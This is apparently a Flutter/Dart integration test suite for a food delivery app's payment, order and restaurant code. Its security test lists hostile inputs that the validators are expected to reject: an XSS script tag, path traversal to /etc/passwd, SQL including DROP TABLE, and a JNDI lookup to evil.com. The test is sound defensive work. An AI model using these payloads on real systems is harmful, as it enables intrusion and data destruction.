import 'package:flutter_test/flutter_test.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:food_delivery_app/core/config/payment_config.dart';
import 'package:food_delivery_app/core/services/payment_service.dart';
import 'package:food_delivery_app/shared/models/order.dart';
import 'package:food_delivery_app/shared/models/restaurant.dart';

/// Working Integration Test Suite
///
/// This test suite focuses on the core functionality that is known to work
/// and demonstrates integration between key components.
void main() {
  group('Working Integration Tests', () {
    setUpAll(() async {
      // Initialize test environment
      await dotenv.load(fileName: '.env');
      await PaymentConfig.initialize();
    });

    group('Payment System Integration', () {
      test('Payment service should be singleton', () {
        final service1 = PaymentService();
        final service2 = PaymentService();

        expect(identical(service1, service2), isTrue);
      });

      test('Payment configuration should be loaded', () {
        expect(PaymentConfig.isCashOnDeliveryEnabled, isTrue);
        expect(PaymentConfig.minOrderAmount, greaterThan(0));
        expect(PaymentConfig.maxCashAmount, greaterThan(0));
      });

      test('Payment validation should work correctly', () {
        final service = PaymentService();

        // Test card validation
        expect(service.validateCardNumber('4532015112830366'), isTrue); // Visa
        expect(service.validateCardNumber('5555555555554444'), isTrue); // Mastercard
        expect(service.validateCardNumber('378282246310005'), isTrue); // Amex
        expect(service.validateCardNumber('1234567890123456'), isFalse); // Invalid

        // Test expiry validation
        final now = DateTime.now();
        expect(
          service.validateExpiryDate(12, now.year + 1),
          isTrue,
        ); // Future date
        expect(
          service.validateExpiryDate(now.month - 1, now.year),
          isFalse,
        ); // Past date

        // Test CVC validation
        expect(service.validateCvc('123', '4532015112830366'), isTrue);
        expect(service.validateCvc('1234', '378282246310005'), isTrue); // Amex
        expect(service.validateCvc('12', '4532015112830366'), isFalse);
      });

      test('Available payment methods should be consistent', () {
        final service = PaymentService();
        final methods = service.getAvailablePaymentMethods();

        expect(methods, isNotEmpty);

        final cashMethod = methods.firstWhere(
          (method) => method['type'] == PaymentMethodType.cash,
          orElse: () => <String, dynamic>{},
        );

        expect(cashMethod['enabled'], isTrue);
        expect(cashMethod['name'], 'Cash on Delivery');
      });

      test('Card brand detection should be accurate', () {
        final service = PaymentService();

        expect(service.getCardBrand('4532015112830366'), 'visa');
        expect(service.getCardBrand('5555555555554444'), 'mastercard');
        expect(service.getCardBrand('378282246310005'), 'amex');
        expect(service.getCardBrand('6011111111111117'), 'discover');
        expect(service.getCardBrand('1234567890123456'), 'unknown');
      });

      test('Payment method names should be consistent', () {
        expect(
          PaymentConfig.getPaymentMethodName(PaymentMethod.cashOnDelivery),
          'Cash on Delivery',
        );
        expect(
          PaymentConfig.getPaymentMethodName(PaymentMethod.payfast),
          'PayFast',
        );
      });

      test('Payment method descriptions should be informative', () {
        expect(
          PaymentConfig.getPaymentMethodDescription(PaymentMethod.cashOnDelivery),
          'Pay with cash when your order is delivered',
        );
        expect(
          PaymentConfig.getPaymentMethodDescription(PaymentMethod.payfast),
          'Secure online payment via PayFast',
        );
      });
    });

    group('Order Model Integration', () {
      test('Order should create with valid data', () {
        final testOrder = Order(
          id: 'test_order_1',
          userId: 'test_user',
          customerName: 'Test Customer',
          restaurantId: 'test_restaurant',
          restaurantName: 'Test Restaurant',
          deliveryAddress: {'address': '123 Test St'},
          status: OrderStatus.placed,
          orderItems: const [],
          totalAmount: 50.0,
          deliveryFee: 5.0,
          taxAmount: 8.0,
          paymentMethod: 'cash_on_delivery',
          paymentStatus: PaymentStatus.pending,
          placedAt: DateTime.now(),
        );

        expect(testOrder.id, 'test_order_1');
        expect(testOrder.totalAmount, 50.0);
        expect(testOrder.customerName, 'Test Customer');
        expect(testOrder.status, OrderStatus.placed);
        expect(testOrder.paymentStatus, PaymentStatus.pending);
      });

      test('Order status transitions should be logical', () {
        final statuses = [
          OrderStatus.placed,
          OrderStatus.confirmed,
          OrderStatus.preparing,
          OrderStatus.ready_for_pickup,
          OrderStatus.out_for_delivery,
          OrderStatus.delivered,
        ];

        // Verify all standard statuses exist
        for (int i = 0; i < statuses.length; i++) {
          expect(statuses[i], isA<OrderStatus>());
        }

        // Verify delivered is final state
        expect(OrderStatus.delivered, isA<OrderStatus>());
      });

      test('Order payment status should be consistent', () {
        final paymentStatuses = [
          PaymentStatus.pending,
          PaymentStatus.completed,
          PaymentStatus.failed,
          PaymentStatus.refunded,
        ];

        // Verify all payment statuses exist
        for (final status in paymentStatuses) {
          expect(status, isA<PaymentStatus>());
        }
      });
    });

    group('Restaurant Model Integration', () {
      test('Restaurant should create with valid data', () {
        final testRestaurant = Restaurant(
          id: 'test_restaurant_1',
          name: 'Test Restaurant',
          description: 'A test restaurant for integration testing',
          cuisineType: 'Test Cuisine',
          rating: 4.5,
          deliveryFee: 5.0,
          address: {
            'street': '123 Test St',
            'city': 'Test City',
            'postalCode': '12345',
          },
          isActive: true,
        );

        expect(testRestaurant.id, 'test_restaurant_1');
        expect(testRestaurant.name, 'Test Restaurant');
        expect(testRestaurant.rating, 4.5);
        expect(testRestaurant.isActive, isTrue);
      });
    });

    group('Data Consistency Integration', () {
      test('Payment methods should be consistent across services', () {
        final configMethods = PaymentConfig.getEnabledPaymentMethods();
        final serviceMethods = PaymentService().getAvailablePaymentMethods();

        // Both should have at least one method enabled
        expect(configMethods, isNotEmpty);
        expect(serviceMethods, isNotEmpty);

        // Cash on delivery should be available in both
        final configHasCash = configMethods.contains(PaymentMethod.cashOnDelivery);
        final serviceHasCash = serviceMethods.any(
          (m) => m['type'] == PaymentMethodType.cash && m['enabled'],
        );

        expect(configHasCash, isTrue);
        expect(serviceHasCash, isTrue);
      });

      test('Order amounts should be consistent with payment validation', () {
        // Test valid amounts
        expect(
          PaymentConfig.validateOrderAmount(15.0, PaymentMethod.cashOnDelivery),
          isTrue,
        );
        expect(
          PaymentConfig.validateOrderAmount(50.0, PaymentMethod.cashOnDelivery),
          isTrue,
        );

        // Test invalid amounts
        expect(
          PaymentConfig.validateOrderAmount(5.0, PaymentMethod.cashOnDelivery),
          isFalse, // Below minimum
        );
        expect(
          PaymentConfig.validateOrderAmount(6000.0, PaymentMethod.cashOnDelivery),
          isFalse, // Above maximum
        );
      });
    });

    group('Error Handling Integration', () {
      test('Payment service should handle errors gracefully', () {
        final service = PaymentService();

        // Test invalid inputs
        expect(service.validateCardNumber(''), isFalse);
        expect(service.validateCardNumber('invalid'), isFalse);
        expect(service.validateCvc('', '4532015112830366'), isFalse);
        expect(service.validateExpiryDate(0, 2020), isFalse);
      });

      test('Configuration should handle missing values gracefully', () {
        // Test that system defaults to safe values when configuration is missing
        expect(
          PaymentConfig.getPaymentMethodName(PaymentMethod.cashOnDelivery),
          isNotEmpty,
        );
        expect(
          PaymentConfig.getPaymentMethodDescription(PaymentMethod.cashOnDelivery),
          isNotEmpty,
        );
      });
    });

    group('Performance Integration', () {
      test('Payment validation should be performant', () {
        final service = PaymentService();
        final stopwatch = Stopwatch()..start();

        // Test 1000 validations to ensure performance is acceptable
        for (int i = 0; i < 1000; i++) {
          service.validateCardNumber('4532015112830366');
          service.validateExpiryDate(12, DateTime.now().year + 1);
          service.validateCvc('123', '4532015112830366');
        }

        stopwatch.stop();

        // Should complete 3000 validations in under 1 second
        expect(stopwatch.elapsedMilliseconds, lessThan(1000));
      });
    });

    group('Security Integration', () {
      test('Input validation should prevent malicious data', () {
        final service = PaymentService();

        final maliciousInputs = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          '../etc/passwd',
          'SELECT * FROM users',
          'DROP TABLE orders',
          '\${jndi:ldap://evil.com/a}',
        ];

        for (final input in maliciousInputs) {
          // All malicious inputs should be rejected
          expect(service.validateCardNumber(input), isFalse);
          expect(service.validateCvc(input, '4532015112830366'), isFalse);
        }
      });

      test('Payment amounts should be validated for security', () {
        // Test extreme values that could indicate attacks
        expect(
          PaymentConfig.validateOrderAmount(-1000.0, PaymentMethod.cashOnDelivery),
          isFalse,
        );
        expect(
          PaymentConfig.validateOrderAmount(999999999.99, PaymentMethod.cashOnDelivery),
          isFalse,
        );
        expect(
          PaymentConfig.validateOrderAmount(double.infinity, PaymentMethod.cashOnDelivery),
          isFalse,
        );
        expect(
          PaymentConfig.validateOrderAmount(double.nan, PaymentMethod.cashOnDelivery),
          isFalse,
        );
      });
    });

    group('System Integration Health', () {
      test('Core functionality should be stable', () {
        final service = PaymentService();

        // Test core operations multiple times to ensure stability
        for (int i = 0; i < 10; i++) {
          expect(service.validateCardNumber('4532015112830366'), isTrue);
          expect(
            service.validateExpiryDate(12, DateTime.now().year + 1),
            isTrue,
          );
          expect(service.validateCvc('123', '4532015112830366'), isTrue);
        }
      });

      test('System should handle edge cases gracefully', () {
        final service = PaymentService();

        // Null and empty inputs
        expect(service.validateCardNumber(''), isFalse);
        expect(service.validateCvc('', '4532015112830366'), isFalse);

        // Extreme values - use PaymentConfig instead
        expect(
          PaymentConfig.validateOrderAmount(999999.99, PaymentMethod.cashOnDelivery),
          isFalse,
        );
        expect(
          PaymentConfig.validateOrderAmount(0.01, PaymentMethod.cashOnDelivery),
          isFalse,
        ); // Below minimum
      });
    });
  });
}